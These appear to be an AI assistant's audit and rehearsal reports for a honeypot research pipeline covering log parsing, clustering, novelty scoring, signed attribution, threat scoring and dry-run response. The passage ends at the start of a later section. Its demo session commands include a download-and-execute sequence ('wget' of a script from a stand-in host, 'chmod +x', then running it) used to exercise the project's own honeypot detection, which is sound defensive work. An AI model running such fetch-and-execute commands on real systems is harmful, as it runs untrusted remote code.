# Task 29A — Full Academic Demonstration Readiness Audit (ten-stage architecture)

Date: 2026-11-12 (audit around midday IST; deadline EOD) · **Read-only audit.** No code, config, compose, permission or runtime change; no restart; no session created; no key generated; no enforcement; nothing committed. This report supersedes the earlier six-stage version in this folder.

## Evidence classes

| Code | Meaning |
|---|---|
| **T-now** | stage tests executed fresh today (`stage_tests_fresh_run.txt`) |
| **V-now** | runtime fact verified read-only today |
| **V-hist** | verified in an earlier implementation report (not fresh evidence) |
| **Inferred** | from code reading only |
| **E2E** | fresh end-to-end evidence: **none exists yet** |

## 0. Verdict
- **All ten stages are implemented and independently tested.** Today's fresh run: **540 tests passed** across the 15 suites for these stages.
- **No connected ten-stage run exists.** The implementation consists of two branches that both start at Cowrie:

  | Branch | Stages | Connection |
  |---|---|---|
  | **ML branch** | 1 → 2 → 3 → 4 → 5 | automated by `scripts/pipeline.py` |
  | **ML branch, continued** | 6 → 7 → 8 | manual commands; all exist with explicit paths |
  | **Rules and defence branch** | Cowrie events → behavioural evidence → 9 threat scoring → signed attribution → 10 dynamic response & feedback | no driver for attribution signing, the response controller or feedback (library calls only) |

- **The branches meet only conceptually at stage 9.** The novelty and DEC outputs are not passed to threat scoring. By design, novelty is an annotation that is never used for gates.
- **A complete academic dry-run demonstration is achievable today.** It needs:
  - one demo driver script (existing report-folder pattern; no new module);
  - ephemeral, explicitly labelled **demo** signing and approval keys with demo copies of the trust configs (supported pattern);
  - a safe log slice;
  - approval for one fresh session.

  Estimate: **about 4 h** (§9).

## 1. Stage readiness

| # | Stage | Entry point | Independently tested | Connected to previous → next | Status |
|---|---|---|---|---|---|
| 1 | Cowrie honeypot | containers `cowrie-project`, `cowrie-ssh-relay`; demo client `/opt/demo/demo_client.py` in `cowrie-demo-test-client` | **V-now:** all up (Cowrie 42 h, relay 13 h, clients 13 h); log 21,888 lines (no traffic since Task 26A); relay log 11 records; demo client runnable. **V-hist:** Task 26A | → 2 via the log file | **Ready** |
| 2 | Log collection | `scripts/collect_logs.py --container cowrie-project --dest <file>` (docker cp of the **whole** log) | **T-now:** `test_collect_logs` 11 passed | 1 → 2 → 3 via `pipeline.py` | **Ready, but unsafe as-is for the demo:** the whole log also contains historical generation traffic (Dataset V2 source). Use a **post-baseline slice** and `pipeline.py --raw-input` instead |
| 3 | Session reconstruction | `scripts/parse_logs.py --input <raw> --output <sessions.json>` | **T-now:** `test_log_processing` 20, `test_log_encoding` | ✓ in `pipeline.py` | **Ready.** The working tree has your uncommitted edits to this file; tests pass with them |
| 4 | Feature extraction | `scripts/extract_features.py --input <sessions.json> --output <behavior_features.csv> --details <session_details.json>` (V1, 17 DEC features); `preprocess_dataset.py` gives `model_input.csv` and `session_mapping.csv`. Also `scripts/extract_features_v2.py` (13-feature V2 representation; not in the pipeline) | **T-now:** `test_extract_features_v2` 43, `test_dec_preprocessing` 10, `test_pipeline_safety` 13 | ✓ in `pipeline.py` (V1) | **Ready.** `extract_features.py` also has your uncommitted edits |
| 5 | DEC clustering | `ml/cowrie_dec_integration_skeleton/scripts/run_dec_evaluation.py <features.csv> --output <dec_results.csv>` run with `.venv-dec-smoke/Scripts/python.exe` (saved artifacts: 17 features, 3 clusters; no refitting) | **T-now:** `test_dec_runner` 5 passed (uses the DEC environment, 65 s). **V-now:** DEC interpreter present | ✓ in `pipeline.py` | **Ready.** Single-session input: Inferred to work (saved scaler) and to be confirmed in the dry run |
| 6 | Pattern analysis | `scripts/behaviour_pattern_analysis.py --dec-results --mapping --session-details --model-input --output-dir` | **T-now:** 7 passed | 5 → 6: **manual** (explicit paths); not in `pipeline.py` | **Ready.** It is a **corpus-level** analysis (cluster summaries) |
| 7 | Signature generation | `scripts/behaviour_signature_generation.py --cluster-summary --feature-stats --command-analysis --session-profiles --session-details [--cluster-analysis] --output-dir` | **T-now:** 16 passed | 6 → 7: **manual** (explicit paths) | **Ready.** Corpus-level |
| 8 | Novelty assessment | `scripts/novelty_assessment.py --session-details <fresh session_details.json> --signature-file <behaviour_signatures.json> --output-dir` → Known-like / Potentially Novel / Insufficient Evidence / Ambiguous | **T-now:** 31 passed | 7 → 8: **manual** (`--signature-file`) | **Ready.** Assesses individual sessions against signatures |
| 9 | Threat scoring & rules | `threat_assessment` (behavioural evidence → findings, S0–S3 severity, gates 1–8, tiers) via `python -m threat_assessment.run_signed` in the isolated `threat-assessment` container | **T-now:** `test_behavioural_evidence` 80, `test_threat_assessment` 61, `test_trust_boundary` 98, `test_key_role_separation`. **V-hist:** Task 26C container runs (propose for the S4 pattern with a valid signed result) | **8 → 9 MISSING** (no novelty or DEC input); Cowrie events → 9 ✓ (`--cowrie-events`) | **Ready** (container). Host execution is refused by the isolation self-check, because the repository contains the relay private key |
| 9a | Signed attribution (within 9) | `client_attribution` library: `correlate`, `correlate_authentication`, `build_result`, `sign_result`; verified inside `threat_assessment` | **T-now:** `test_trust_boundary`, `test_client_attribution`. **V-now:** deployment result key `pending_provisioning`, no witness block. **V-hist:** Task 26C ephemeral-key validation | signer → 9 via `--signed-result` ✓; **no signer CLI/driver** | **Library ready; demo key needed** |
| 10 | Dynamic response & feedback | `dynamic_response` library: `ResponseController`, `approve_cli` (`build_approval`/`sign_approval`), `feedback` (`annotate`, `outcomes`, `review_queue`, `metrics`) | **T-now:** `test_dynamic_response` 105 passed (fixture assessments) | 9 → 10: library intake of `assessments.jsonl` + `audit.jsonl` (compatible, Inferred); **no driver**; the approver registry is empty | **Library ready; demo approver key and a driver needed** |

## 2. Exact commands (for review only; none was run in this audit)

**A. Before the session (read-only):**
```
docker ps --filter name=cowrie --format "{{.Names}} {{.Status}}"
MSYS_NO_PATHCONV=1 docker exec cowrie-project /cowrie/cowrie-env/bin/python3 -c "print(sum(1 for _ in open('/cowrie/cowrie-git/var/log/cowrie/cowrie.json')))"   # BASELINE
wc -l cowrie/attributing_relay/records/relay_mapping.jsonl                                                                                                   # RELAY_BASELINE
```

**B. Stage 1: one fresh controlled session** (needs separate approval):
```
MSYS_NO_PATHCONV=1 docker exec cowrie-demo-test-client /cowrie/cowrie-env/bin/python3 /opt/demo/demo_client.py shell --host 10.250.25.2 --port 2222 \
   --line "uname -a" --line "wget http://files.example/x.sh -O x.sh" --line "chmod +x x.sh" --line "./x.sh"
```

**C. Stage 2: collection, as a safe slice of only the new lines** (replaces `collect_logs.py` for the demo):
```
MSYS_NO_PATHCONV=1 docker exec cowrie-project /cowrie/cowrie-env/bin/python3 -c "import sys
for i,l in enumerate(open('/cowrie/cowrie-git/var/log/cowrie/cowrie.json')):
    i>=BASELINE and sys.stdout.write(l)" > <DEMO>/raw/cowrie_fresh.json
```

**D. Stages 3–5: the existing pipeline,** with no attack, no collection and a separate output directory (it refuses to overwrite the tracked `data/` outputs):
```
python scripts/pipeline.py --skip-attack --raw-input <DEMO>/raw/cowrie_fresh.json --output-dir <DEMO>/pipeline
```
Outputs in `<DEMO>/pipeline/`:
- `parsed/sessions.json`;
- `parsed/behavior_features.csv`, `parsed/session_details.json`;
- `processed/model_input.csv`, `processed/session_mapping.csv`, `models/scaler.joblib`;
- `processed/dec_results.csv` (cluster and confidence for the fresh session).

**E. Stage 6: pattern analysis.** Run on the **baseline corpus** outputs (`data/processed/*`, `data/parsed/session_details.json`, the project's tracked V1 baseline; not Dataset V2), so clusters are meaningful. Optionally run it on the fresh session too, for its behaviour profile.
```
python scripts/behaviour_pattern_analysis.py --dec-results data/processed/dec_results.csv --mapping data/processed/session_mapping.csv \
   --session-details data/parsed/session_details.json --model-input data/processed/model_input.csv --output-dir <DEMO>/behaviour_analysis
```

**F. Stage 7: signature generation:**
```
python scripts/behaviour_signature_generation.py --cluster-summary <DEMO>/behaviour_analysis/cluster_summary.csv \
   --feature-stats <DEMO>/behaviour_analysis/cluster_feature_statistics.csv --command-analysis <DEMO>/behaviour_analysis/cluster_command_analysis.csv \
   --session-profiles <DEMO>/behaviour_analysis/session_behaviour_profiles.csv --session-details data/parsed/session_details.json \
   --cluster-analysis <DEMO>/behaviour_analysis/cluster_analysis.json --output-dir <DEMO>/behaviour_signatures
```

**G. Stage 8: novelty of the fresh session:**
```
python scripts/novelty_assessment.py --session-details <DEMO>/pipeline/parsed/session_details.json \
   --signature-file <DEMO>/behaviour_signatures/behaviour_signatures.json --output-dir <DEMO>/novelty
```

**H. Stage 9a: signed attribution.** There is **no CLI**; this is the driver (Task 26C pattern), stated as library calls:
1. Read the new relay records (post-`RELAY_BASELINE`; the whole log is needed for chain verification).
2. `config_from_document(<DEMO v3 copy>)`.
3. `correlate(events, relay_lines, relay_pub_pem, cfg, evaluation_time=now)`.
4. `correlate_authentication(events)`.
5. `build_result(...)`.
6. `sign_result(result, <ephemeral DEMO result key in memory>)`.
7. Write `signed_result.json`, the DEMO public key and the DEMO v3 + policy copies to `cowrie/assessment_work/input/`.

**I. Stage 9: threat scoring.** Isolated container (existing compose profile; no deployment change):
```
MSYS_NO_PATHCONV=1 docker compose -f cowrie/docker-compose.yml --profile assessment run --rm -T threat-assessment --repo-root /opt/project \
  --attribution-config /work/input/threat_attribution_v3_DEMO.json --policy /work/input/defence_policy_v2_2_DEMO.json \
  --result-public-key /work/input/attribution_result_DEMO.pub.pem --calibration /work/input/calibration.json \
  --cowrie-events /work/input/cowrie_fresh.json --signed-result /work/input/signed_result.json --now <ISO now> --out-dir /work/output/demo
```

**J. Stage 10: response and feedback.** There is **no CLI**; this is the driver, stated as library calls:
1. `response_policy_from_document(<DEMO response policy with an ephemeral approver public key>)`.
2. `ResponseController(policy, att, defence_policy, ResponseAuditLog(<DEMO>/response_audit.jsonl))`.
3. `.intake(assessment, audit_entries, now)`.
4. `sign_approval(build_approval(proposal, "approve", "DEMO APPROVER", key_id, now, 600), <ephemeral approver key>)`.
5. `.submit_decision`, then `.execute(mode="dry_run")`.
6. `.record_verification({…, restriction_observed: false, control_unaffected: true, result: "pass", operator, evidence_ref})`.
7. `.revoke`, then `.record_rollback_verification(...)`.
8. `annotate(...)`, `outcomes(...)`, `metrics(...)`, `review_queue(...)`, `verify_response_log(...)`.

## 3. Integration paths (the ten handoffs)

| Handoff | Path | Status |
|---|---|---|
| 1. Cowrie logs → session reconstruction | `collect_logs.py` → `parse_logs.py` (in `pipeline.py`) | **connected**; for the demo, substitute the safe post-baseline slice with `--raw-input` |
| 2. Sessions → feature extraction | `parse_logs.py` → `extract_features.py` (in `pipeline.py`) | **connected** |
| 3. Features → DEC | `behavior_features.csv` → `run_dec_evaluation.py` (in `pipeline.py`, DEC environment) | **connected** |
| 4. DEC → pattern analysis | `dec_results.csv`, `session_mapping.csv`, `session_details.json`, `model_input.csv` → CLI flags | **connected by files** (manual); not in `pipeline.py` |
| 5. Pattern analysis → signatures | `reports/behaviour_analysis/*` (or `--output-dir`) → CLI flags | **connected by files** (manual) |
| 6. Signatures → novelty | `behaviour_signatures.json` → `--signature-file` | **connected by files** (manual) |
| 7. Analysis outputs → threat scoring | — | **MISSING.** `run_signed` takes Cowrie events and signed results only. Behavioural evidence accepts a `novelty` annotation (`EvidenceEngine.evaluate(…, novelty=…)`), but `run_signed` passes none. Even if it did, by design novelty is `used_for_assessment: false`, and DEC clusters are never inputs |
| 8. Threat assessment ↔ signed attribution | signed result → `--signed-result`; verified inside the assessment | **connected** (attribution is an *input* to scoring); **signer driver missing** |
| 9. Signed attribution / assessment → dynamic response | `assessments.jsonl` + `audit.jsonl` → `ResponseController.intake` | **library-compatible** (same `ThreatAssessor`/`AuditLog` as the tests; Inferred); **driver missing** |
| 10. Response outcomes → feedback | `ResponseAuditLog` → `feedback.*` | **connected** (library); no CLI |

## 4. Threat scoring and rules (verified by code and today's tests)
- **Evidence requirements:** behavioural evidence catalogue `v2-evidence-1.1`.
  - Findings come from interpretations with **interpretation-specific** evidence levels E0–E3.
  - Caveats, novelty and single failed logins never trigger anything.
  - `behavioural_status ∈ {indeterminate, insufficient_evidence}` → **abstain**.
- **Severity:** `threat_assessment/severity.py` S0–S3, by interpretation, attempt-based; success is never inferred. Unchanged since Task 24 (hash-verified in Tasks 26C–28B).
- **Gates for propose** (policy 2.2.0, schema 2.1); all must pass:

  | Gate | Requirement |
  |---|---|
  | 1 | a finding ≥ S2 |
  | 2 | E2+ on an S2+ finding |
  | 3 | ≥ 2 distinct action indicators |
  | 4 | **an authentication event**: `cowrie.login.success` correlated by session ID in a verified signed result for relay sessions; command input alone never counts |
  | 5 | attributable source (`attributable` or `attributable_via_proxy_mapping` from a **verified signed result**) |
  | 6 | not protected, shared or enforcement-excluded (from `configs/address_safety_v1.json`) |
  | 7 | verified configuration digests (attribution ↔ policy ↔ address safety; evidence-config digest) |
  | 8 | no processing errors |

- **Tiers:**

  | Tier | Condition |
  |---|---|
  | abstain | error or indeterminate/insufficient evidence |
  | record | no S2+ finding |
  | review | S2+ finding, some gate fails |
  | propose | all gates pass; dry-run `block_source_ip` with `manual_approval: pending`, `execution: not_executed` |

- **Expected outcome for the fresh session** (Inferred from V-hist S4): the same commands from the test client (10.250.25.3) give *download attempt* S2/E2 and *download-and-execute attempt* S3/E2, EXEC-1 + XFER-1, and a login event. With a verified DEMO signed result the tier is **propose**; without one, **review** (gate 5).
  - **No gate or severity change is needed**, and none must be made.
  - The control client (10.250.25.4) always gives **review** (enforcement-excluded).

## 5. Dynamic response and feedback (verified by code and today's 105 tests)

| Capability | Behaviour |
|---|---|
| Proposal validation | `propose` tier, all gates, relay-mapped attribution from an accepted signed result, verifying assessment audit chain |
| Approval | approver-signed exact rule (target, action, duration, created and expiry times, four fingerprints); the controller verifies only |
| Allowlist | 10.250.25.3/32 only |
| Duration | ≤ 900 s, never renewed |
| Replay and duplicates | single decision; duplicate and replay rejection |
| Execution | dry-run only (relay boundary disabled, 0 calls); operator verification required, and never success without it |
| Rollback | simulated (failed rollback stays failed) |
| Audit | hash-chained `response-audit-1` with state machine and tamper/replay detection |
| Feedback | outcomes, annotations, review queue, metrics; no effect on gates, severity, evidence or models |

## 6. Demonstration trust configuration (supported, isolated, labelled)

**Supported pattern** (V-hist, Task 26C `validate_remediation.py`; Task 27B test fixtures), at demo run time:
1. **Result key:** generate an ephemeral Ed25519 result key **in memory**; write only its public key, as `attribution_result_DEMO.pub.pem`.
2. **Attribution config copy:** write a **copy** of `configs/threat_attribution_v3.json` with `config_version "3.0.0-DEMO"`, `attribution_result.status "provisioned"`, the DEMO public-key SHA-256, a key validity of today only, and a status note *"DEMO ONLY — ephemeral key, not production trust"*.
3. **Policy copy:** a copy of `defence_policy_v2_2.json` with `policy_version "2.2.0-DEMO"`, pinning the DEMO v3 digest. The address-safety pin is unchanged (`657aa680…`).
4. **Approver:** generate an ephemeral approver key in memory, and write a DEMO copy of `response_policy_v1.json` with `approver_registry.status "provisioned"` and one approver named "DEMO APPROVER (ephemeral)", whose identity differs from the relay and result keys (K-1).
5. **Location:** store the copies only in the demo report folder and `cowrie/assessment_work/input/`, **never** in `configs/`. The private halves are never written.
6. **Scope:** the production configs stay `pending_provisioning`, and D0, the witness, M0–M8 and A1 are untouched. No checkpoint witness is used: the deployment v3 has no witness block, and the demo states this explicitly.

## 7. Configuration prerequisites, outputs and log locations

| Item | Location / state |
|---|---|
| Relay public key / validity | `cowrie/attributing_relay/relay_mapping_ed25519.pub.pem`; valid until 2026-12-11 (V-now) |
| Live relay records | `cowrie/attributing_relay/records/relay_mapping.jsonl` (host bind, read with operator ACL) |
| Cowrie log | inside `cowrie-project`: `/cowrie/cowrie-git/var/log/cowrie/cowrie.json` (read through `docker exec`; post-baseline slice only) |
| Calibration | `reports/behaviour_evidence_framework_implementation_20261111/config/sensor_calibration_lab_train.json` |
| DEC environment | `ml/cowrie_dec_integration_skeleton/.venv-dec-smoke/Scripts/python.exe` (V-now present; T-now tests passed) |
| Baseline corpus for stages 6–7 | `data/processed/{dec_results,session_mapping,model_input}.csv`, `data/parsed/session_details.json` (tracked V1 baseline) |
| Assessment I/O | `cowrie/assessment_work/{input,output}` (empty; mounted by the profile) |
| Time windows | relay record ≤ 24 h; result ≤ 1 h; proposal 30 min; rule ≤ 15 min; correlation skew 2 s |

**Expected outputs:** in `<DEMO>/`:

| Stage | Artefacts |
|---|---|
| 1 | `demo_client` RESULT JSON; Cowrie events; relay records |
| 2 | `raw/cowrie_fresh.json` |
| 3 | `pipeline/parsed/sessions.json` |
| 4 | `pipeline/parsed/behavior_features.csv`, `session_details.json`, `processed/model_input.csv`, `session_mapping.csv` |
| 5 | `pipeline/processed/dec_results.csv` |
| 6 | `behaviour_analysis/{cluster_summary, cluster_feature_statistics, cluster_command_analysis, session_behaviour_profiles}.csv`, `cluster_analysis.json` |
| 7 | `behaviour_signatures/behaviour_signatures.{json,csv}`, summary |
| 8 | `novelty/novelty_assessment_results.{csv,json}`, summary |
| 9a | `signed_result.json` + verification summary |
| 9 | container `isolation.json`, `evidence.jsonl`, `assessments.jsonl`, `audit.jsonl`, `summary.json` |
| 10 | `response_audit.jsonl` (+ checkpoint), `outcomes.json`, `metrics.json`, `review_queue.json` |
| all | `SHA256SUMS` |

## 8. Blockers, ranked

| # | Priority | Blocker | Resolution |
|---|---|---|---|
| B1 | **High** | No driver for 9a → 9 → 10 → feedback (signer, controller, feedback have no CLI) | one demo driver script in the demo report folder, reusing `validate_remediation.py` and the Task 27B call patterns |
| B2 | **High** | Result key and approver registry `pending_provisioning` | approval for **ephemeral in-memory DEMO keys** and DEMO config copies (§6) |
| B3 | **High** | Fresh session not yet approved; no E2E evidence exists | approve one test-client session (optionally one control-client session) |
| B4 | **Medium** | The pipeline's collection step would copy the whole Cowrie log (historical generation traffic) | use the post-baseline slice + `--raw-input` (supported flag) |
| B5 | **Medium** | Handoff 7 (novelty/DEC → threat scoring) not connected; by design novelty is annotation-only | demonstrate both branches side by side in one demo summary. A code link (`run_signed` passing a `novelty` annotation) would change existing code; it is not needed for correctness and is not recommended today |
| B6 | **Medium** | Stages 6–7 are corpus-level; on one session they produce a one-session profile only | run 6–7 on the baseline corpus; run 5 and 8 for the fresh session against those signatures |
| B7 | **Medium** | Single-session behaviour of DEC / pattern analysis not yet exercised (Inferred) | confirm in the dry run (driver rehearsal with the Task 26A captured events, which are allowed and already excluded) |
| B8 | **Low** | Time windows (30 min proposal / 15 min rule) | the driver runs 9a → 10 within minutes |
| B9 | **Low** | The new session IDs must be excluded from future datasets | register in the demo report; a new `session_exclusions` version later |
| B10 | **Low** | `parse_logs.py` / `extract_features.py` carry your uncommitted edits | tests pass today (T-now); the demo uses the working-tree versions, and we record their hashes |

## 9. Estimated time per blocker

| Blocker | Estimate |
|---|---|
| B1 driver (attribution + container run + response + feedback + artefact packaging) | 1.5–2 h |
| B2 DEMO key/config generation inside the driver | 20 min (part of B1) |
| B4 + B6 + B7 ML-branch commands, verified on the safe slice; single-session check | 45 min |
| B5 combined demo summary (both branches, one table) | 15 min |
| B3 + B8 fresh session and full run | 30 min |
| B9 + B10 registration and hashing | 10 min |
| Rehearsal | 30 min |
| **Total** | **about 4 h** (+ about 10 min per re-run if a time window lapses) |

## 10. Minimal sequence to complete the demonstration today
1. Obtain approvals: B1 driver, B2 DEMO keys and configs, B3 one fresh session, `cowrie/assessment_work` usage and clean-up.
2. Write and rehearse the driver on the Task 26A captured events (already excluded; no new session).
3. Record `BASELINE`, `RELAY_BASELINE`; run the fresh test-client session (stage 1).
4. Slice the new log lines (stage 2) → `pipeline.py --skip-attack --raw-input … --output-dir …` (stages 3–5).
5. Pattern analysis + signatures on the baseline corpus (6–7) → novelty of the fresh session (8).
6. Driver: DEMO keys → signed attribution (9a) → container threat scoring (9) → dry-run response with DEMO approval, operator verification and simulated rollback (10) → feedback.
7. Package all artefacts + SHA256SUMS; register the fresh session ID for exclusion; record "no enforcement, no witness, DEMO keys only".

## 11. Tested vs. historical vs. fresh E2E

| Claim | Class |
|---|---|
| Containers up, log/relay counts, CLIs, config states | **V-now** |
| Each stage's logic (540 tests across 15 suites, incl. the DEC runner in its environment) | **T-now** |
| S4-style session reaching propose with a signed result; container isolation | **V-hist** (Task 26C) |
| Dynamic response on a real container assessment; single-session DEC and pattern analysis; handoff 9 | **Inferred** |
| Any connected run of all ten stages on a fresh session | **None yet** |

**Confirmation:**
- **Read-only:** inspection, `--help`, read-only `docker ps`/`exec` line counts, and fresh test execution only. No source, config, compose, permission or runtime change; no restart; no session; no key; no enforcement; no witness activation.
- **No protected data:** no Dataset V2 raw data or sealed data was accessed (and `ml_pipeline/work` was not opened), and no excluded session ID was reused. Nothing was committed.

Stopped. Fixes and the fresh run need separate approval.

---

# Task 29B — Demonstration orchestration and synthetic rehearsal (2026-11-12)

**Status:** the rehearsal is complete. It used synthetic fixtures only, and **all 31 checks passed** (run `20261112T065445Z-ad9e34`).
- No fresh network session was generated.
- No enforcement was run and no witness was activated. D0 and M0–M8 were not performed.
- No service was restarted and no model was refitted. Nothing was committed.
- The architecture is unchanged: the script only calls the existing stages.

## 12.1 Script and invocation
The script is `reports/academic_demo_readiness_20261112/demo_orchestrator.py`. Run it from the repository root. In Git Bash, prefix each command with `MSYS_NO_PATHCONV=1`.

| Mode | Command | Status |
|---|---|---|
| synthetic rehearsal | `python reports/academic_demo_readiness_20261112/demo_orchestrator.py rehearse` | run in this task |
| show the live steps | `… demo_orchestrator.py print-live-commands` | prepared |
| live (fresh session) | `… demo_orchestrator.py live --cowrie-baseline N --relay-baseline M --approved` | **prepared, not run**; needs separate approval |

**The branches as executed.** No stage was replaced, and neither branch reads the other's output.
- **ML branch:**
  1. The slice goes to `scripts/pipeline.py --skip-attack --raw-input <slice> --output-dir <run>/ml/pipeline`. This runs `parse_logs.py`, then the V1 `extract_features.py`, then preprocessing, then DEC from the saved artifacts using `.venv-dec-smoke`.
  2. `behaviour_pattern_analysis.py` and `behaviour_signature_generation.py` run on the **baseline V1 corpus** (`data/processed/*` and `data/parsed/session_details.json`), which is read only.
  3. `novelty_assessment.py` scores the new session against those signatures.
- **Rules branch:**
  1. The Cowrie events and relay records go to `client_attribution.correlate`, `build_result` and `sign_result` (signed with the DEMO result key).
  2. The signed result goes to the isolated `threat-assessment` container (compose profile `assessment`, `network_mode: none`). It runs the unchanged `threat_assessment.run_signed`: behavioural evidence, then the gates, then the tier.
  3. The assessment goes to `dynamic_response.ResponseController` in dry-run mode, then to `feedback`.
- DEC and novelty results do **not** feed threat scoring. No such link exists in the implementation, and none was added.

## 12.2 DEMO configuration and key handling
**Keys**
- Each role gets its own Ed25519 key, created with `Ed25519PrivateKey.generate()` in process memory:
  - relay record (rehearsal only; it signs the synthetic relay records);
  - attribution result;
  - human approver.
- The three keys are distinct; the script checks this.
- Private keys are **never serialised or written**, and they are gone when the process exits.
- Only public keys and pins are written. Each is labelled `DEMO ONLY - ephemeral in-memory key, not production trust`.

**Configs**

The script builds the DEMO configs in memory from the approved document shapes. It writes them only to `cowrie/assessment_work/input/`, with a `-DEMO` file suffix and a `*-DEMO` `config_version`:

| DEMO config | Contents |
|---|---|
| `threat_attribution_v3_DEMO` | pins the DEMO relay and result keys; validity from 1 h before to 12 h after the run |
| `defence_policy_v2_2_DEMO` | proposal conditions **identical** to 2.2.0; only the pinned digests change, to the DEMO ones |
| `address_safety_DEMO` | lists identical to `address_safety_v1.json` 1.0.0, embedded in the script |
| response policy | in memory only; one DEMO approver; `mode: dry_run`, `enforcement_activated: false` |

The v3 copy sets `address_safety.path` to `../../work/input/…`. The container therefore resolves it to `/work/input` and never to `configs/`.

**Live mode** will use the existing relay **public** key and record log, both read only. The relay private key is never touched.

## 12.3 Synthetic rehearsal results (run `20261112T065445Z-ad9e34`)
**Fixture**
- **Session:** a random ID, `00bae095780a`, checked against the 7 excluded IDs.
- **Events:** 14, all with `sensor: SYNTHETIC-DEMO`, from the relay address 172.22.0.2. They include `login.success` and the commands `uname -a`, `wget … -O x.sh`, `chmod +x x.sh` and `./x.sh`.
- **Relay records:** 3 (start, open and close; client 10.250.25.3 via 10.250.25.2:2222), signed by the DEMO relay key.

No excluded or historical session records were used or reproduced.

| # | Requirement | Result |
|---|---|---|
| 1 | Orchestrator works on synthetic fixtures | PASS: all ten stages ran |
| 2 | Branches independent | PASS: 26 files were opened during the rules branch, none under the ML output folder. The rules input is the events and relay records only |
| 3 | Correct handoffs | PASS: see the handoff table below |
| 4 | Signing and verification with DEMO keys | PASS: the relay chain verifies and the session is attributed to 10.250.25.3. The container verified the DEMO-signed result, and the controller verified the DEMO-signed approval |
| 5 | Altered attribution rejected | PASS: with the client IP changed, the result fails with `result_hash mismatch (result modified)` and there is no proposal |
| 6 | Unsigned attribution cannot authorise a response | PASS: the assessor reports `unsigned attribution result` with no proposal, and the controller refuses intake |
| 7 | Dry-run only | PASS: the outcome is `simulated (not enforced)`. A spy on `DisabledRelayEnforcement` saw **0** calls, and `mode="enforce"` was refused (1 rejected operation, logged) |
| 8 | Feedback linked to the response record | PASS: label `true_positive` on `prop-task26c-isolated-000001`, final state `rolled_back`, `response_success` true. The response audit chain verifies |
| 9 | No production config or key loaded | PASS: see 12.4 |
| 10 | Cleanup removes only demo artifacts | PASS: 8 input files and the run's output folder were removed. Both work folders are empty again and still exist |

**Handoffs (requirement 3)**

| Branch | From → to | Output |
|---|---|---|
| ML | slice → parsing → features → DEC | `dec_results.csv`: cluster 1, confidence 0.913 |
| ML | stage 6 → stage 7 | 1 signature from the 5 baseline sessions |
| ML | stage 7 → novelty | **Known-like**, closest signature `sig-4e22763125d03876`, score 0.786 |
| Rules | signed result → container → assessment | **propose**, all gates true; the login rests on `cowrie.login.success` correlated by session ID in the signed result |
| Rules | assessment → response → feedback | proposal → approval → rule → verification → feedback |

**Attempt 1.** The first run, kept for transparency as `rehearsal/attempt1_20261112T065313Z-281f5a`, passed 28 of 30 checks. Both failures were in my checks, not in the stages:
1. **Container check:** it counted files read by the existing `run_signed` isolation self-check. That check reads every repository file **to scan for private-key bytes**; it does not load them as configuration. The scan is now recorded as a separate `isolation_scan` phase.
2. **Branch-independence check:** it counted the orchestrator's own end-of-run reads of ML outputs for the summary.

Both checks were made precise. No stage code changed.

## 12.4 Evidence: no production configuration loaded
- **Host process:** a Python audit hook recorded 171 opened files (`rehearsal/…/opened_files_host.json`). None is under `configs/`, `secrets/` or `ml_pipeline/work`, none is `cowrie.json`, and none is a Dataset V2 or sealed path.
- **Container:** an audit hook in the wrapper recorded opened files by phase (`artifacts/assessment/opened_files.json`).
  - **Assessment phase:** exactly 7 DEMO inputs from `/work/input`, including the DEMO address-safety file, plus its own outputs. **0** production configs.
  - **Isolation-scan phase:** 63 repository files read byte by byte for key material, 18 of them under `configs/`. None was under `secrets/`, which is not mounted. This is the existing safety check, not configuration loading.
- **Response layer:** the `dynamic_response` policy, the approver registry and the defence-policy objects were built from in-memory DEMO documents only.

## 12.5 Evidence: historical Cowrie log not copied or processed
- `pipeline.py` sets `collect = False` whenever `--raw-input` is given, so `collect_logs.py` never ran. Only 5 subprocess commands ran; `run_summary.json` lists them.
- No command referenced `cowrie-project` (checked), and the host process never opened `cowrie.json`. The raw input was the 14-line synthetic slice.
- **Live mode (not run):** it streams Cowrie lines through `docker exec` and keeps **only lines at or after the recorded baseline**. It rejects any slice that contains an excluded ID.

## 12.6 File hashes (SHA-256)

| File | Before | After |
|---|---|---|
| `scripts/parse_logs.py` | `4987a671271450016ede8172230abd1ec49ded22a2190a71b471f577dbbaa414` | identical |
| `scripts/extract_features.py` | `6524aedf68d8aca4aacc30ab2531acdb52614ba63c9c374061fe1bd7203b653e` | identical |

Both remain uncommitted working-tree edits; git status is unchanged. The baseline corpus files keep their 2026-10-19 timestamps.

## 12.7 Temporary artifacts
**Created and removed.** Only these were removed:
- in `cowrie/assessment_work/input/`:
  - `cowrie_events_DEMO-…jsonl`
  - `address_safety_DEMO-…json`
  - `threat_attribution_v3_DEMO-…json`
  - `defence_policy_v2_2_DEMO-…json`
  - `attribution_result_DEMO-….pub.pem`
  - `calibration_DEMO-…json`
  - `signed_result_DEMO-…json`
  - `demo_container_wrapper-….py`
- in `cowrie/assessment_work/output/`: the folder `demo-<run id>/`.

Cleanup deletes only paths in the run's own manifest. It then checks that both folder listings match the listings taken before the run.

**Kept as evidence** in the report folder:
- `rehearsal/20261112T065445Z-ad9e34/`, containing `run_summary.json`, `opened_files_host.json` and a copy of the artifacts in `artifacts/`;
- `rehearsal/attempt1_…/`.

These hold DEMO public keys and DEMO configs only; no private key.

**Containers.** The `compose run --rm` container was removed automatically. The running services (`cowrie-project`, `cowrie-ssh-relay` and both demo clients) show 0 restarts and unchanged start times.

## 12.8 Remaining blockers

| ID | Status |
|---|---|
| B1 driver, B2 DEMO keys and configs, B4 safe slice, B6 corpus-level stages 6–7, B7 single-session ML behaviour, B8 time windows, B10 hashes | **resolved** in the rehearsal |
| B3 | **open:** one fresh test-client session needs your approval. Then run `live` mode, recording both baselines first; `print-live-commands` shows the steps |
| B5 | unchanged by design: the two branches are shown side by side in `run_summary.json` |
| B9 | **open:** after the live run, register the new session ID in a new `session_exclusions` version (v1 stays unchanged) |
| new | Live mode is untested against real data until B3 is done. Its relay-boundary check only confirms that the relay log grew; the session is matched by the signed correlation, not by line index. Live mode uses the DEMO result and approver keys with the **real** relay public key |

Stopped after the synthetic rehearsal.

---

# Task 29C — Approved fresh test-client session: ML branch (2026-11-12)

> **ACTUAL FRESH-SESSION RESULTS.** These come from one real SSH session generated by the demo test client.
> They are distinct from the Task 29B results (§12), which used a **synthetic** fixture (session `00bae095780a`, never on the network).

**Status:** ML branch complete, and **all 17 live checks passed** (run `20261112T070531Z-670781`).
- **Not run:** threat scoring, signing, response and feedback, as instructed. They wait for your review.
- **Unchanged:** no service was restarted, no model was refitted, no threshold or definition was changed, and nothing was committed.

## 13.1 Session and baselines

| Item | Value |
|---|---|
